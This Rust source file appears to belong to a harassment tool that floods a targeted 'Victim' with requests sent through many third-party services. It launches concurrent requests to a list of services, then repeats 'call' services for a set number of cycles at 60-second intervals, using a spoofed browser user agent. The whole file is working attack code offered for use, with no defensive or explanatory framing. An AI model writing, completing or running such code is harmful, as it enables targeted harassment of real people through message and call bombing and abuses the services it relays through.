use crate::services::{
    construct_call_services_list, construct_services_list, BodyType, Service, Victim,
};
use reqwest::{Client, Method};
use std::time::Duration;

const SERVICES_DELAY: u8 = 0;
const CALL_DELAY: u8 = 60;

pub async fn send(victim: Victim, cycles: u64) -> Result<(), Box<dyn std::error::Error>> {
    let mut s = Vec::new();

    let services = construct_services_list(victim.clone()).await;
    for service in services {
        let t = tokio::spawn(async move {
            send_single(service).await.expect("");
        });
        s.push(t);
    }

    let t = tokio::spawn(async move {
        for _ in 0..cycles {
            let services = construct_call_services_list(victim.clone()).await;
            for service in services {
                send_single(service).await.expect("");
                tokio::time::sleep(Duration::from_secs(CALL_DELAY as u64)).await;
            }
        }
    });
    s.push(t);

    for i in s {
        i.await?;
    }

    Ok(())
}

async fn send_single(service: Service) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::builder()
        .user_agent("Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0")
        .default_headers(service.headers)
        .build()
        .expect("");

    let mut res;
    match service.method {
        Method::GET => res = client.get(service.url),
        Method::POST => res = client.post(service.url),
        _ => panic!("Unsupported method"),
    }
    match service.body_type {
        BodyType::JSON => res = res.json(&service.body),
        BodyType::Form => res = res.form(&service.body),
    }

    let res = res.send().await?;
    println!("{} {}\n{}\n", service.name, res.status(), res.text().await?);

    Ok(())
}
